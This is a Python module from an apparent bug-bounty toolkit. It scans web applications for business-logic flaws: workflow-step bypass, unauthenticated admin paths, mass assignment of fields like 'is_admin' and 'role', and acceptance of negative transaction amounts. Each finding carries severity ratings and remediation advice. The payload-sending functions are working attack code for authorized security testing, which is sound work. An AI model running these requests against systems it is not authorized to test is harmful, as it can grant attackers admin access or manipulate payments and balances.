# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""Business Logic — workflow bypass, mass assignment, negative values, privilege escalation."""

import urllib.parse
import urllib.request
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

WORKFLOW_PATHS = [
    "/checkout/confirm","/checkout/complete","/order/confirm",
    "/payment/success","/pay/success","/purchase/complete",
    "/account/upgrade","/subscription/activate","/premium/activate",
    "/api/order/complete","/api/checkout/confirm","/api/payment/success",
    "/admin/activate","/api/coupon/apply","/api/voucher/redeem",
]

PRIV_PATHS = [
    "/admin","/admin/users","/admin/dashboard","/admin/settings",
    "/api/admin","/api/users","/api/admin/users","/api/admin/dashboard",
    "/superuser","/manage","/management","/api/v1/admin","/api/v2/admin",
    "/staff","/operator","/api/internal","/api/private",
]

MASS_ASSIGN_FIELDS = [
    "role","is_admin","admin","is_superuser","user_type","account_type",
    "privilege","group","permissions","verified","email_verified","active",
    "status","level","tier","plan","subscription","credits","balance",
]

API_ENDPOINTS = [
    "/api/user","/api/profile","/api/account","/api/me",
    "/api/register","/api/signup","/api/update",
]

NEG_AMOUNT_PATHS = [
    "/api/transfer","/api/payment","/api/charge","/api/purchase",
    "/api/order","/api/cart/add","/api/withdraw","/api/redeem",
    "/api/donate","/api/topup",
]

SUCCESS_WORDS = ["success","processed","charged","accepted","created",
                 "updated","welcome","dashboard","logout","complete"]

CVSS_CRIT = "9.1 (Critical) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
CVSS_HIGH = "8.1 (High)     — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS_MED  = "6.5 (Medium)   — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"


def _check_workflow_bypass(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in WORKFLOW_PATHS:
        url = base_url.rstrip("/") + path
        resp = fetch_url(url, timeout=timeout)
        if resp and resp.get("status") == 200:
            body = (resp.get("body") or "").lower()
            if any(w in body for w in ["success","complete","thank you","confirmed","order placed","payment"]):
                findings.append({
                    "type": "Business Logic — Workflow Step Bypass",
                    "severity": "HIGH",
                    "url": url,
                    "cvss": CVSS_HIGH,
                    "description": f"Checkout/payment completion page accessible without completing payment flow: {path}",
                    "steps_to_reproduce": (
                        f"1. Navigate directly to: {url}\n"
                        "2. Observe order/payment confirmation page without going through payment.\n"
                        "3. Order/premium content may be granted."
                    ),
                    "impact": "Attacker completes purchases/upgrades without payment. Revenue loss.",
                    "recommendation": "Enforce server-side state machine. Validate each step has been completed with signed tokens. Never rely on client-side redirect flow.",
                })
    return findings


def _check_priv_escalation(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in PRIV_PATHS:
        url = base_url.rstrip("/") + path
        resp = fetch_url(url, timeout=timeout)
        if resp and resp.get("status") == 200:
            body = (resp.get("body") or "").lower()
            if any(w in body for w in ["user","email","dashboard","manage","settings","admin","config"]):
                findings.append({
                    "type": "Business Logic — Unauthenticated Privilege Escalation",
                    "severity": "CRITICAL",
                    "url": url,
                    "cvss": CVSS_CRIT,
                    "description": f"Admin/privileged path accessible without authentication: {path}",
                    "steps_to_reproduce": f"1. curl -s '{url}'\n2. Observe privileged content without login.",
                    "impact": "Full admin access — user management, config changes, data exfiltration.",
                    "recommendation": "Enforce authentication on ALL routes. Use middleware. Never rely on frontend-only auth guards.",
                })
    return findings


def _check_mass_assignment(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in API_ENDPOINTS:
        url = base_url.rstrip("/") + path
        for field in MASS_ASSIGN_FIELDS[:8]:
            for val in [True, 1, "admin", "superuser"]:
                payload = json.dumps({field: val, "name": "test"}).encode()
                try:
                    for method in ["PUT", "PATCH", "POST"]:
                        req = urllib.request.Request(url, data=payload, method=method)
                        req.add_header("Content-Type", "application/json")
                        req.add_header("User-Agent", "BugBountyTool/1.0")
                        with urllib.request.urlopen(req, timeout=timeout) as r:
                            body = r.read(1000).decode("utf-8", errors="replace").lower()
                            if r.status in (200, 201) and (field in body or any(w in body for w in SUCCESS_WORDS)):
                                findings.append({
                                    "type": "Business Logic — Mass Assignment",
                                    "severity": "HIGH",
                                    "url": url,
                                    "method": method,
                                    "field": field,
                                    "value": str(val),
                                    "cvss": CVSS_HIGH,
                                    "description": f"Server accepted privileged field '{field}={val}' via {method} — mass assignment vulnerability.",
                                    "steps_to_reproduce": (
                                        f"1. {method} {url}\n"
                                        f"   Body: {{{field!r}: {val!r}}}\n"
                                        "2. Observe field accepted in response — privilege may be escalated."
                                    ),
                                    "impact": "User can self-assign admin role or bypass subscription limits.",
                                    "recommendation": "Use explicit field allowlists (never auto-bind). Ignore unknown/privileged fields from client input.",
                                })
                                return findings
                except Exception:
                    pass
    return findings


def _check_negative_values(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in NEG_AMOUNT_PATHS:
        url = base_url.rstrip("/") + path
        for amount in ["-1", "-0.01", "0", "-100", "-9999"]:
            payload = json.dumps({"amount": amount, "price": amount, "quantity": amount}).encode()
            try:
                req = urllib.request.Request(url, data=payload, method="POST")
                req.add_header("Content-Type", "application/json")
                req.add_header("User-Agent", "BugBountyTool/1.0")
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    body = r.read(1000).decode("utf-8", errors="replace").lower()
                    if r.status in (200, 201) and any(w in body for w in SUCCESS_WORDS):
                        findings.append({
                            "type": "Business Logic — Negative/Zero Value Accepted",
                            "severity": "HIGH",
                            "url": url,
                            "amount": amount,
                            "cvss": CVSS_HIGH,
                            "description": f"API accepted negative/zero amount ({amount}) as valid transaction.",
                            "steps_to_reproduce": (
                                f"1. POST {url} with amount={amount}\n"
                                "2. Observe success response — transaction processed with invalid amount."
                            ),
                            "impact": "Account balance manipulation, free items, negative balance that credits attacker.",
                            "recommendation": "Validate all financial values server-side: reject negative, zero, or unreasonably large amounts. Use Decimal types.",
                        })
                        return findings
            except Exception:
                pass
    return findings


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 8, **kwargs) -> dict:
    findings: list[dict] = []
    with ThreadPoolExecutor(max_workers=4) as ex:
        f1 = ex.submit(_check_workflow_bypass,  base_url, timeout)
        f2 = ex.submit(_check_priv_escalation,  base_url, timeout)
        f3 = ex.submit(_check_mass_assignment,  base_url, timeout)
        f4 = ex.submit(_check_negative_values,  base_url, timeout)
        for f in [f1, f2, f3, f4]:
            findings.extend(f.result())
    return {
        "findings": findings,
        "summary": {
            "total_findings": len(findings),
            "checks": ["workflow-bypass","privilege-escalation","mass-assignment","negative-value"],
        },
    }


if __name__ == "__main__":
    pass
